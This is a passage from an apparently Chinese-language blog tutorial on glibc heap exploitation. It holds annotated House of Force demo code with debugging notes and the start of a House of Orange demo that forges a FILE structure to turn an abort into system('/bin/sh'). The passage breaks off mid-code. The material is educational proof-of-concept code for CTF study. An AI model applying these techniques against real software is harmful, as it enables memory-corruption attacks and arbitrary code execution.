<span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// House of Force是覆写top chunk来分配任意内存地址的攻击方法</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// top chunk是一个特殊的chunk,是内存中最后一块chunk,在向系统申请更多空间的情况下将会更改size的大小</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//在最后,我们将会使用这个方法来覆写bss_var的值</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先分配一个chunk p1(256)</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在堆由两个chunk组成,一个是我们分配的,另一个就是top chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以覆盖top chunk的大小</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用一个超大的值来覆盖top chunk以让我们可以确保malloc永远不会调用mmap来申请空间</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们的top chunk的size巨大非凡,我们可以随意申请内存而不会调用mmap</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="comment">// 下面,我们将通过整数溢出分配一个直达我们所需区域的,之后就可以在我们所需区域处分配一个chunk出来</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">我们所需的size是这么计算的:</span></span><br><span class="line"><span class="comment">     nb是我们要求的size+元数据</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">    <span class="comment">// 按预期,新的指针和旧的top chuk在同一位置</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="comment">// 现在,我们覆写的下一个chunk将指向我们的目标buffer</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">    <span class="comment">// 现在,我们终于可以覆写这个值啦!</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-12"><a href="#运行结果及调试-12" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先申请了p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539237307/0" alt="image-20210518154759704"></p><p>此时我们修改我们top chunk的size为-1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539243039/0" alt="image-20210518154926372"></p><p>此时因为top chunk的size巨大无比，所以无论我们申请多少的空间，他都不会再调用mmap了</p><p>现在我们计算evil_size的大小</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539373867/0" alt="image-20210518161628202"></p><p>然后我们申请一个evil_size大小的chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539394391/0" alt="image-20210518162025441"></p><p>现在我们新申请的chunk是从之前的top chunk起始的，此时我们再申请一个chunk就可以拿到我们想要申请的地址了</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539576432/0" alt="image-20210518165600310"></p><p>程序首先建立了一个全局变量bss_var,也就是我们需要攻击的地方</p><p>随后分配了chunk p1(256),现在我们的top chunk的size是一个比较小的值</p><p>因此我们假设有一个漏洞可以覆写top chunk的size,我们通过写入-1来使size变为一个巨大的数(0xffffffffffffffff)</p><p>此时无论我们再申请多大的空间,ptmalloc都不会再向系统申请调用mmap了(当然..如果把0xfffffffffffffff的空间都用完了还是会申请的</p><p>现在我们计算出了evil_size所需的值,也就是</p><p>evil_size=(bss_var-16)-(ptr_top)-16</p><p>此时我们先申请一个大小为evil_size的chunk,此时新指针和旧的top chunk在同一位置,而size正好是旧top chunk到我们bss_var的差值</p><p>此时我们再申请一块chunk就可以获得我们想控制的var_bss了。</p><h1 id="0x14-house-of-orange"><a href="#0x14-house-of-orange" class="headerlink" title="0x14 house of orange"></a>0x14 house of orange</h1><p>house of orange来自angelboy在hitcon 2016上出的一道题目,这个攻击方法并不单指本文所说的,而是指关于其一系列的伴生题目的漏洞利用技巧</p><p>其最主要的原理就是在没有free的情况下如何产生一个free状态的bins和io_file的利用</p><p>但最最最主要的利用是io_file的利用</p><h2 id="源代码-14"><a href="#源代码-14" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      // house of orange开始于一个在堆上有一个可以破坏top chunk的缓冲区溢出漏洞的假设</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      // 在执行前,整个heap都是top chunk的一部分</span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      // 通常来说,第一次申请内存的时候会从top chunk中切出一部分来处理请求</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      // 然后,随着我们不停的分配top chunk,top chunk会变得越来越小</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      // 而在我们所申请的size比top chunk更大时会有两件事情发生</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">      // 1.拓展top chunk,mmap一个新页</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在2.26的更改中,程序不在调用_IO_flush_all_lockp的malloc_printer的行为移除了我们攻击的媒介</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 由于对glibc 2.24 中 _IO_FILE vtable进行了白名单检查,因此这种攻击手段得到了抑制</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    